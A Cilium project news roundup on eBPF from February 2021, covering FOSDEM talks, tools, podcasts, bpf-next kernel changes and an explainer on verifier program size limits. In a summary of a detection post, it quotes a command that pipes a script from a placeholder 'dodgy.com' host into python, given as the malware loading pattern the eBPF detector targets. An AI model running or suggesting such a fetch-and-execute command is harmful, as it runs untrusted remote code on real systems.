---
path: "/blog/ebpf-updates-2021-02"
date: "2021-02-23T10:00:00.000Z"
title: "eBPF Updates #4: In-Memory Loads Detection, Debugging QUIC, Local CI Runs, MTU Checks, but No Pancakes"
toc: true
tags:
  - _
categories:
  - Update
---

{{preview}}

In several parts of the globe, February is traditionally about love, and
pancakes. eBPF sure received a lot of love over the last weeks! Blogging,
conferencing, and kernel development have resumed full speed after the quiet
period at the end of the year. Here are all the latest updates, plus a section
focusing on program size limits. Alas, uncertainty remains as for eBPF getting
pancakes.

{{/preview}}

In several parts of the globe, February is traditionally about love, and
pancakes. eBPF sure received a lot of love over the last weeks! Blogging,
conferencing, and kernel development have resumed full speed after the quiet
period at the end of the year. Here are all the latest updates, plus a section
focusing on program size limits. Alas, uncertainty remains as for eBPF getting
pancakes.

## New Resources

<!--2021-02-07-->
Besides pancakes and Valentine's Day, early February is also marked by one of
the biggest events centered on open-source: FOSDEM! This year's edition was
held online, and included several presentations related to eBPF.

* [_Advanced BPF kernel features for the container age_](https://fosdem.org/2021/schedule/event/containers_ebpf_kernel/),
  from Daniel Borkmann.  
  eBPF is in a unique position to efficiently process and steer packets at
  different steps of their travel through the stack. Cilium relies on it to
  implement advanced networking features for cloud-native environments. After a
  brief reminder on the potential of eBPF, Daniel dives into three of those
  features: consistent service load-balancing for Kubernetes with XDP and
  Maglev, low-latency Pod fast-path through dedicated eBPF helpers to bypass
  iptables rules and other parts of the stack, and EDT (Earliest Departure
  Time) rate-limiting for Pods. Recommended if you want to learn more on
  advanced networking features entirely implemented with eBPF.

* [_hXDP: Efficient Software Packet Processing on FPGA NICs_](https://fosdem.org/2021/schedule/event/sdn_hxdp_fpga/),
  from Marco Spaziani Brunella.  
  hXDP is an eBPF hardware offload implementation for FPGA-based NICs. Through
  hardware functions, some additional compiler work, and custom optimizations,
  it achieves great performance. Latest work include working on a higher-end
  platform, and trying to implement eight processing cores instead of one.

* [_Networking Performances in the Linux Kernel, Getting the most out of the Hardware_](https://fosdem.org/2021/schedule/event/network_performance_in_kernel/),
  from Maxime Chevallier.  
  Definitely centered on networking, this presentation follows the path of
  packets through the low-level mechanisms involved in the hardware and in the
  Linux stack. There is not much about eBPF itself, but the last section of the
  talk helps understand how XDP and AF\_XDP complement the other networking
  components in the kernel.

* [_Monitoring MariaDB Server with bpftrace on Linux_](https://fosdem.org/2021/schedule/event/mariadb_bpftrace/),
  from Valerii Kravchuk.  
  This presentation is both an introduction to bpftrace itself and to its
  application to MariaDB tracing. The objective is to add uprobes, get stack
  traces, or inspect some specific components to trace and profile the MariaDB
  server in production. Benchmark results confirm that bpftrace performs better
  than pt-pmp or perf.  
  Valerii also covered the topic in
  [a series of posts on his blog](https://mysqlentomologist.blogspot.com/2021/01/playing-with-recent-bpftrace-and.html).

* [_Seccomp Notify on Kubernetes_](https://fosdem.org/2021/schedule/event/containers_k8s_seccomp_notify/),
  from Alban Crequy.  
  This talk demonstrates how to use seccomp notify to proxy some system
  calls—including `bpf()`— to the container manager, from an unprivileged
  container. Seccomp relies on cBPF (_classic BPF_) to filter system calls and
  take actions on them. Seccomp notify is a recent update where seccomp can
  return a file descriptor and hand it to another task, so that this task can
  analyze the data involved in the filtered system call and potentially emulate
  it from user space. Christian Brauner has written extensively about
  [seccomp notify](https://people.kernel.org/brauner/the-seccomp-notifier-new-frontiers-in-unprivileged-container-development)
  and
  [the `bpf()` use case](https://people.kernel.org/brauner/the-seccomp-notifier-cranking-up-the-crazy-with-bpf).

* [*Deploying eBPF, XDP & AF\_XDP for Cloud Native*](https://fosdem.org/2021/schedule/event/sdn_ebpf_afxdp/),
  from Dave Cremins and Gary Loughnane.  
  As per the abstract, “*This talk will cover an introduction to AF\_XDP, why it
  is suited to cloud native microservices, how it can be deployed today and the
  deployment challenges as well as their solutions.*” [We could not attend the
  presentation, and the video and slides have not been uploaded yet as of this
  writing].

And then here are some resources published over the last week, independent from
FOSDEM.

<!--2020-12-17-->
* [_Running eBPF and Perf in Docker for Mac_](https://petermalmgren.com/docker-mac-bpf-perf/),
  from Peter Malmgren.  
  Perf and eBPF tools are handy tools to trace processes and to pin down the
  origin of a performance bottleneck. Motivated by the need to identify the
  cause of a slowdown in a Docker container running on macOS, this post
  explains how to install the Linux headers, to compile BCC and bpftrace, and
  to run them in the container.

<!--2021-01-11-->
* [_Debugging QUIC with H2O and QLog_](https://www.fastly.com/blog/debugging-quic-with-h2o-and-qlog),
  from Toru Maesaka.  
  The H2O HTTP server deployed by Fastly has a built-in event tracing
  infrastructure, powered by eBPF or DTrace depending on the platform. This
  post is not really about eBPF, but it presents an interesting use case of
  eBPF with USDT (probes for user space applications) to adapt QLog to the H2O
  server and get logs to debug and improve QUIC, a network protocol implemented
  in user space.

<!--2021-01-25-->
* [_eBPF & the future of osquery on Linux_](https://medium.com/fleetdm/ebpf-the-future-of-osquery-on-linux-c9f33726e84d) (video),
  from Zach Wasserman.  
  Osquery has been relying on the Audit subsystem in Linux to provide system
  visibility, which is powerful but comes with some drawbacks. For example, it
  supports a single consumer, making osquery conflict with the auditd daemon,
  and it lacks awareness of containers. eBPF can be used since osquery 4.6.0 as
  an alternative backend to collect data, circumventing these issues and coming
  with “a potential to dramatically increase scope of observability”.

<!--2021-01-27-->
* [_eBPF Tools: An Overview of Falco, Inspektor Gadget, Hubble and Cilium_](https://thenewstack.io/ebpf-tools-an-overview-of-falco-inspektor-gadget-hubble-and-cilium/),
  from Lucas Severo Alves.  
  Here is an introduction to each of the four eBPF-based tools mentioned in the
  title, accompanied with example use cases. All these tools focus on
  cloud-native environments, so this post provides a good overview of the eBPF
  landscape in the cloud, and of the different issues it addresses in terms of
  security, tracing, visibility, and networking.

<!--2021-02-03-->
* [_Datadog On eBPF_](https://www.youtube.com/watch?v=58KtGtpn0_g) (video),
  from Lee Avital, Guillaume Fournier and Ara Pulido.  
  Various aspects of eBPF are covered in this presentation. After introducing
  the basics, Datadog discusses technical details related to their workflow: Is
  it better to guess the offset of kernel structures or to rely on runtime
  compilation? They also describe two of their use cases for eBPF, network
  monitoring and runtime security.

<!--2021-02-09-->
* [_A Beginner's Guide to eBPF with Go_](https://web.archive.org/web/20210216233137/https://files.gotocon.com/uploads/slides/conference_39/1688/original/Beginners%20guide%20to%20eBPF%20with%20Go.pdf) (PDF),
  from Liz Rice.  
  Learn how to program with eBPF and Go with this accessible tutorial. After a
  reminder of the basics of eBPF, this presentation focuses on a simple tracing
  example with bpftrace. Then it explains how to write a first “Hello, World!”
  program with eBPF and the libbpfgo Go bindings for the libbpf C library,
  before showing how to recreate the bpftrace command previously introduced.

<!--2021-02-15-->
* [_Using eBPF to uncover in-memory loading_](https://blog.tofile.dev/2021/02/15/ebpf-01.html),
  from Pat H.  
  Tracing with eBPF can be adapted to nearly any use case. In this post,
  programs are attached to trace the calls to `dup2()`, `write()` and `read()`,
  in order to detect when two process are sharing information through a bash
  pipe (`|`). The objective of the experiment is to detect commands constructed
  like this: `curl https://dodgy.com/loader.py | python -`, where a rogue
  process attempts in-memory loading of a malware. The post contains a
  refresher on how writing to and reading from pipes work on Linux, making it
  easy to understand and follow where the eBPF programs are attached.

### Software Projects

* The new <https://editor.cilium.io/> is a NetworkPolicy editor, introduced by
  the Cilium community as an easy and interactive way to learn, create,
  visualize, and share Kubernetes NetworkPolicies. It provides an intuitive
  overview of some of the features that Cilium implements with eBPF. More
  details are available in
  [the editor's announcement](https://cilium.io/blog/2021/02/10/network-policy-editor).

* [Tracee version 0.5.0](https://github.com/aquasecurity/tracee/discussions/563)
  is out. From a tracing command line tool, the project evolves into a runtime
  security solution and now encompasses tracee-ebpf—the command-line tool
  itself—and the libbpfgo library. It also includes tracee-rules, a “new rule
  engine to process tracee-ebpf's events and detects suspicious behavior based
  on built-in and user-defined 'signatures'”, which are defined in Open Policy
  Agent's Rego language or in Go.

* [TCPDog](https://github.com/mehrdadrad/tcpdog) is a new tool to collect TCP
  statistics with eBPF and to export them to an Elasticsearch or InfluxDB
  database. It can collect from all TCP-related kernel tracepoints at the same
  time, but the parameters to collect are configurable.

### Software: Demos and Experiments

* Guardicore released [IPCDump](https://github.com/guardicore/IPCDump) for
  tracing interprocess communications on Linux, be it through pipes, FIFOs,
  signals, UNIX sockets, loopback-based networking, or pseudoterminals. It
  draws some inspiration from Windows's procmon. Internally, it uses the gobpf
  library that provides Go bindings for the BCC framework. See also
  [the announcement post](https://www.guardicore.com/labs/ipcdump-guardicores-new-open-source-tool-for-linux-ipc-inspection/)
  for more details, with a few examples of tracing communication from Chrome
  events, or between processes like containerd and dockerd.

* Liz Rice has published a set of
  [basic eBPF examples using libbpfgo](https://github.com/lizrice/libbpfgo-beginners).
  The eBPF program is trivial, the objective is to get familiar with
  [libbpfgo](https://github.com/aquasecurity/tracee/tree/main/libbpfgo), a set
  of bindings in Go to the libbpf C library.

* [XDP minimal example](https://ruderich.org/simon/notes/xdp-minimal-example)
  is a note from Peter Ruderich describing a small but standalone XDP example,
  with a few explanations and pointers. This is an interesting program to get
  started with XDP (but don't forget the
  [XDP tutorial](https://github.com/xdp-project/xdp-tutorial/)).

* [BPF-UprobeDBG](https://github.com/pathtofile/bpf-uprobedbg) is a
  proof-of-concept experiment showing how to send signals to a process from a
  uprobe tracing a function of that same process. If that process is being
  debugged in gdb for example, this will stop its execution and allow for close
  inspection as well as step-by-step debugging. The eBPF program is responsible
  for computing the precise conditions under which the improvised breakpoint
  should trigger.

### Podcasts

<!--2021-01-28-->
* [_Break Things on Purpose_ | Mikolaj Pawlikowski, Engineering Lead at Bloomberg](https://www.gremlin.com/blog/podcast-break-things-on-purpose-mikolaj-pawlikowski-engineering-lead-at-bloomberg/#ebpf),
  interview from Jason Yee and Pat Higgins.  
  Centered on Chaos Engineering, this episode mentions eBPF as “a game changer”
  in terms of visibility. The technology uses small code snippets, has a low
  overhead, but allows for unprecedented inspection and metrics gathering, most
  of the time without the traced application knowing anything about visibility.

Members of the Cilium community have been very active, and contributed to
several podcasts on eBPF and Cilium over the last weeks:

<!--2021-02-02-->
* [Software Engineering Daily - _Cilium: Programmable Linux Networking with Dan Wendlant and Thomas Graf_](https://softwareengineeringdaily.com/2021/02/02/cilium-programmable-linux-networking-with-dan-wendlant-and-thomas-graf/),
  interview from Jeff Meyerson.  
  Virtual machines, and then containers, have led to important changes on how
  applications are managed. In response, Thomas explains, network processing
  and policing had to evolve. eBPF, and Cilium which builds on top of it, bring
  comprehensive networking, visibility, and security at scale to clusters.

<!--2021-02-02-->
* [Software Engineering Radio, Episode 445 - _Thomas Graf on eBPF (extended Berkeley Packet Filter)_](https://www.se-radio.net/2021/02/episode-445-thomas-graf-on-ebpf-extended-berkeley-packet-filter/),
  interview from Justin Beyer.  
  This episode focuses on eBPF itself, and explains how the technology can help
  with network processing to safely implement packet routing and network
  policies. Learn how eBPF interacts with elements such as namespaces, cgroups,
  or TCP congestion.

<!--2021-02-08-->
* [DiscoPosse Podcast, Episode 153 - _Kubernetes Networking and Security, and Building Business on Open Source with Isovalent Founder, Thomas Graf_](https://discopossepodcast.com/ep-153-kubernetes-networking-and-security-and-building-business-on-open-source-with-isovalent-founder-thomas-graf/),
  interview from Eric Wright.  
  Thomas comes back on the evolution on Linux networking and on some of the new
  challenges to solve in cloud deployments. He explains how eBPF is in a unique
  position to address all these challenges, bringing an ideal balance between
  the expressiveness of the instruction set and a strong focus on networking.
  Thomas adds that the open source community now has an essential role into
  networking and the cloud infrastructure at large, and explains how Isovalent
  builds its product on top of the Cilium open source project.

<!--2021-02-10-->
* [The Weekly Squeak - _eBPF Cloud Native computing with Neela Jacques of Isovalent_](https://www.youtube.com/watch?t=439&v=QrKt8PhAkiE),
  interview from Chris Chinchilla.  
  By operating from inside the kernel, eBPF offers unprecedented capabilities
  in terms of tracing and network processing. This allows Cilium and then
  Isovalent to propose powerful solution to address both the networking and
  security aspects for containerized workflows, in particular in a context
  where security requirements have been evolving a lot over the few years, and
  where securing only at the perimeter is no longer an option. eBPF brings all
  this, Neela explains, and makes it scale efficiently.

## The Kernel Side

Here is a summary of the main changes included in the second
[pull request for the bpf-next tree](https://lore.kernel.org/bpf/20210216001516.3248-1-daniel@iogearbox.net/t/#u)
for the 5.12 cycle.

* Add a script to run the eBPF CI locally. It was already possible to build and
  run the eBPF selftests locally, but this script runs them on the same kernel
  image as the continuous integration frameworks that validates the patch sets
  on their submission. The objective is to have contributors run the selftests
  on their machine but in the same environment as the CI, to check for
  regressions and reduce the back-and-forth between maintainers and developers.
  If you send patches to the bpf or bpf-next trees, take note!
  <span style="white-space: nowrap;">(KP Singh,
  [link](https://lore.kernel.org/bpf/20210204194544.3383814-1-kpsingh@kernel.org/t/#u))</span>

* Support passing pointers to types with known size as arguments to a global
  function. The objective is to overcome the limit on the maximum number of
  allowed arguments for eBPF functions (five arguments): Additional arguments
  can be stored in a struct, and a pointer to this struct passed to the
  function. The struct can contain pointers, but they cannot be dereferenced in
  the callee. Passing pointers is not supported for static functions (The
  distinction between global and static functions is conveyed by the BTF
  information loaded alongside the program).
  <span style="white-space: nowrap;">(Dmitrii Banshchikov,
  [link](https://lore.kernel.org/bpf/20210212205642.620788-1-me@ubique.spb.ru/t/#u))</span>

* Add an eBPF iterator for `task_vma` which allows the user to generate
  information similar to what is available from /proc/pid/maps, but customized
  for their needs. For example, when a VMA (Virtual Memory Area) covers mixed
  2MB pages and 4kB pages, one use case is to indicate which address ranges are
  backed by 2MB pages.
  <span style="white-space: nowrap;">(Song Liu,
  [link](https://lore.kernel.org/bpf/20210212183107.50963-1-songliubraving@fb.com/t/#u))</span>

* Allow `bpf_getsockopt()` and `bpf_setsockopt()` helpers from all
  `sock_addr`-related program hooks, so that listener sockets attached to
  cgroups can query or modify socket options as needed at the various available
  attach points.
  <span style="white-space: nowrap;">(Stanislav Fomichev,
  [link](https://lore.kernel.org/bpf/20210127232853.3753823-1-sdf@google.com/t/#u))</span>

* In a set containing various improvements, Alexei adds a mechanism to prevent
  recursion on fentry/fexit programs (extendable to sleepable programs in the
  future). A recursion would occur, for example, when tracing a function called
  by an eBPF helper, with a program that would itself call that helper.
  Other patches in the set also enable the use of “map-in-map” and per-CPU
  maps, as well as statistics, for sleepable programs (A few tracing programs
  and eBPF LSM programs can request, at load time, to be sleepable in order to
  call helpers requiring the ability to sleep).
  <span style="white-space: nowrap;">(Alexei Starovoitov,
  [link](https://lore.kernel.org/bpf/20210210033634.62081-1-alexei.starovoitov@gmail.com/t/#u))</span>

* Support the use of eBPF ring buffers for sleepable programs.
  <span style="white-space: nowrap;">(KP Singh,
  [link](https://lore.kernel.org/bpf/20210204193622.3367275-1-kpsingh@kernel.org/t/#u))</span>

* Extend the verifier to enable variable offset read and write access to the
  eBPF program stack. For example, if a stack-allocated array is declared in a
  program, it becomes possible (under certain conditions) to read from or write
  to a cell at an index which is not statically known at compile and load time,
  but only determined at runtime.
  <span style="white-space: nowrap;">(Andrei Matei,
  [link](https://lore.kernel.org/bpf/20210207011027.676572-1-andreimatei1@gmail.com/t/#u))</span>

* Rework MTU handling in TC and XDP programs. MTU (Maximum Transmission Unit)
  checks performed by the eBPF helpers would sometimes be too conservative in
  preventing growing the size of a packet, because they would not consider the
  possibility of a redirection and would look at the MTU for the wrong
  interface. This set lifts some of the limitations, and adds a new
  `bpf_check_mtu()` helper to allow eBPF programs to query a device's MTU and
  run the check themselves.
  <span style="white-space: nowrap;">(Jesper Dangaard Brouer,
  [link](https://lore.kernel.org/bpf/161287779408.790810.15631860742170694244.stgit@firesoul/t/#u))</span>

* Extend the `bpf_get_socket_cookie()` helper to make it available from tracing
  programs, including sleepable ones.
  <span style="white-space: nowrap;">(Florent Revest,
  [link](https://lore.kernel.org/bpf/20210210111406.785541-1-revest@chromium.org/t/#u))</span>

* Clean up and slightly improve the performance for AF\_XDP sockets. Also add a
  probe to libbpf (but it should be moved to libxdp in the future) to check
  what features the kernel supports, and pick the most efficient eBPF program
  to load from the library when setting up the socket.
  <span style="white-space: nowrap;">(Björn Töpel,
  [link](https://lore.kernel.org/bpf/20210122105351.11751-1-bjorn.topel@gmail.com/t/#u))</span>

* Allow BTF to contain information on zero-sized .rodata ELF sections. Such
  sections may be formed by certain read-only (`const`) initialized variables,
  that the compiler stores into the .rodata as global variables. Because the
  variable was not initially declared as global, there is no debug information
  to store in the BTF information for that section.
  <span style="white-space: nowrap;">(Yonghong Song,
  [link](https://lore.kernel.org/bpf/20210119153519.3901963-1-yhs@fb.com/t/#u))</span>

* Improve XDP performance for the veth by allocating socket buffers in bulks
  for `ndo_xdp_xmit()`.
  <span style="white-space: nowrap;">(Lorenzo Bianconi,
  [link](https://lore.kernel.org/bpf/a14a30d3c06fff24e13f836c733d80efc0bd6eb5.1611957532.git.lorenzo@kernel.org/t/#u))</span>

## Did You Know? Program size limit

Do you know what is the maximum size of an eBPF program? You may have heard of
programs limited to 4k instructions, but this has changed some time ago.

One particularity of eBPF programs, enforced at load time by the kernel
verifier, is that they must run and eventually terminate within a relatively
short delay. Allowing for long runs would slow down the kernel too much.
Permitting users to run arbitrary programs, possibly containing infinite loops,
could even hang the kernel completely.

To avoid that, the verifier builds the direct acyclic graph (DAG) representing
the possible paths of execution in the program, and ensures that each one leads
to termination. Sometimes, some branches “overlap” between several paths, and
under certain conditions the verifier can skip verifying them after the first
occurrence. This is called “state pruning”. Without this mechanism, the number
of instructions to validate would be too high and slow down program loading
beyond what is acceptable.

When eBPF was introduced, there were two parameters that would limit its size:

- The maximum number of instructions for a program: 4096
- The complexity limit: 32768

The second number represents the number of instructions that the verifier is
allowed to check before forfeiting the verification and rejecting the program.
You may think of it as “the total number of instructions cumulated over all the
execution paths, minus those on branches that the verifier is able to prune”.
So if a program had many logical branches and would require too much effort
from the verifier, it would fail to load, even if it had fewer than 4096
instructions.

But both limits were changed[^1] in
[a commit in Linux 5.2](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c04c0d2b968ac45d6ef020316808ef6c82325a82).
**The complexity limit was raised to one million verified instructions**. As
for the maximum limit of instructions, it simply disappeared, meaning that the
size of program is now limited by the complexity induced by their verification.
There is still a _de facto_ hard limit at one million instructions, for a
program that would have a single logical branch (no “if” and comparisons
anywhere). In practice, such program would be of little interest. Programs have
branches, their verification is more complex, and their allowance for
instructions decreases accordingly.

The 4096-instruction limit did not, in fact, disappear entirely. The kernel
still enforces it for programs loaded by non-root users (more precisely, users
without `CAP_SYS_ADMIN` or, starting with Linux 5.8, `CAP_BPF`).

eBPF programs tend to be small, and the one-million-state complexity
limit is big enough that most use cases will never hit it. Some advanced
projects using eBPF to implement more complex features may be facing it, and
Cilium for example is regularly adjusting to satisfy the verifier's
requirements. Some ways to work around complexity may include the use of tail
calls and bounded loops (introduced in Linux 5.3), or reorganizing the code in
such a way that the number of branches decreases or that the verifier can prune
them more efficiently.

Hardware offload is yet another story, and has entirely different constraints
since the program must fit into the hardware's memory. The bound is set as much
by the verifier as by the hardware's capacity, with the efficiency of bytecode
generation and then of the JIT-compiler
[both playing a role](https://www.netronome.com/blog/optimizing-bpf-smaller-programs-greater-performance/).

The new, one-million-state complexity limit should be flexible enough for most
use cases, and in the end, programs have truly one bound: Your imagination!

[^1]: The complexity limit was actually changed several times since
  [the 32k value from its introduction in Linux 3.18](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=17a5267067f3c372fec9ffb798d6eaba6b5e6a4c):
  it was raised to
  [64k in Linux 4.7](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=07016151a446d25397b24588df4ed5cf777a69bb),
  then to
  [96k in Linux 4.12](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3c2ce60bdd3d57051bf85615deec04a694473840),
  again to
  [128k in Linux 4.14](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8e17c1b16277cba0e9426de6fe78817df378f45c),
  and at last to
  [1M in Linux 5.2](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c04c0d2b968ac45d6ef020316808ef6c82325a82).

## Community

The eBPF community keeps growing!

<blockquote class="twitter-tweet" data-dnt="true"><p lang="en" dir="ltr">We have recently passed 2,000 members in the main <a href="https://twitter.com/hashtag/ebpf?src=hash&amp;ref_src=twsrc%5Etfw">#ebpf</a> slack channel. If you are interested in eBPF, the channel is a great start to chat with the community and get started.<br><br>Get your invite here:<a href="https://t.co/Geqq9RbKsx">https://t.co/Geqq9RbKsx</a> <a href="https://t.co/WieobQ3tKc">pic.twitter.com/WieobQ3tKc</a></p>&mdash; Thomas Graf (@tgraf__) <a href="https://twitter.com/tgraf__/status/1354808116106334209?ref_src=twsrc%5Etfw">January 28, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> 

<blockquote class="twitter-tweet" data-dnt="true"><p lang="en" dir="ltr">eBPF is so cool. Worth investing your time in learning it. This thing is X-ray vision.</p>&mdash; ⬜️🟥⬜️ (@PieCalculus) <a href="https://twitter.com/PieCalculus/status/1358891574374133763?ref_src=twsrc%5Etfw">February 8, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

<blockquote class="twitter-tweet" data-dnt="true"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/eBPF?src=hash&amp;ref_src=twsrc%5Etfw">#eBPF</a> eBPF everywhere! <br>The future is do damn exciting.</p>&mdash; Praveen K (@praveenkp) <a href="https://twitter.com/praveenkp/status/1359065959181475842?ref_src=twsrc%5Etfw">February 9, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

However, one of the challenges that remain is apparently to find enough time to
start working with eBPF.

<blockquote class="twitter-tweet" data-dnt="true"><p lang="en" dir="ltr">2020 is going to be my year for eBPF ... {{ looks at the calendar }} 2021 is going to be my year for eBPF</p>&mdash; Richard Stubbs (@richardstubbs) <a href="https://twitter.com/richardstubbs/status/1354512352067072010?ref_src=twsrc%5Etfw">January 27, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

<blockquote class="twitter-tweet" data-dnt="true"><p lang="en" dir="ltr">I am so glad that the country has a boring President so I can read my eBPF book without distraction.</p>&mdash; Yamamoto (@BanItchy) <a href="https://twitter.com/BanItchy/status/1356161707144437761?ref_src=twsrc%5Etfw">February 1, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

Now we only miss a tweet about eBPF and pancakes.

## Credits

eBPF Updates are brought to you by the [Cilium project](https://cilium.io).
This report was produced by Quentin Monnet (Isovalent).
Thanks to Cilium engineering team for input and reviews.

If you would like to submit contributions for the next report, please submit
them via **the `#ebpf-news` channel on [eBPF Slack](https://ebpf.io/slack/)**.
